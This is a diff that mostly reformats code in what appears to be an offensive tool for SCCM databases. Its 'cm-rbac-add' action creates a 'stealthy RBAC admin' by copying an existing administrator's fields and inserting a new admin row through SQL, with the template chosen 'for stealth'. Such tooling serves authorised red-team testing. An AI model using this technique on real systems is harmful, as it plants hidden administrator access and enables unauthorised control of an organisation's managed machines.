@@ -34,7 +34,9 @@ class CMRbacAdd(CMBaseAction):
         named, positional = self._parse_action_arguments(additional_arguments)
         self._account_name = self.get_positional_argument(positional, 0, "")
         if not self._account_name:
-            raise ValueError("Account name is required. Usage: cm-rbac-add <domain\\\\user>")
+            raise ValueError(
+                "Account name is required. Usage: cm-rbac-add <domain\\\\user>"
+            )
 
     def execute(self, database_context: DatabaseContext) -> Optional[list]:
         logger.info(f"Creating stealthy RBAC admin: {self._account_name}")
@@ -63,10 +65,14 @@ ORDER BY CreatedDate DESC;"""
                     return None
 
                 # Select template admin (prefer middle entry for stealth)
-                template_idx = 2 if len(existing_admins) >= 5 else len(existing_admins) // 2
+                template_idx = (
+                    2 if len(existing_admins) >= 5 else len(existing_admins) // 2
+                )
                 template = existing_admins[template_idx]
 
-                logger.info(f"  Using template: {template.get('LogonName')} (entry {template_idx + 1} of {len(existing_admins)})")
+                logger.info(
+                    f"  Using template: {template.get('LogonName')} (entry {template_idx + 1} of {len(existing_admins)})"
+                )
 
                 # Insert new admin mimicking template
                 insert_query = f"""
@@ -85,7 +91,9 @@ VALUES (
     '{str(template.get("SourceSite", ""))}'
 );"""
 
-                rows_affected = database_context.query_service.execute_non_processing(insert_query)
+                rows_affected = database_context.query_service.execute_non_processing(
+                    insert_query
+                )
                 if rows_affected and rows_affected > 0:
                     logger.success("RBAC admin created successfully")
                     logger.info(f"  Account: {self._account_name}")
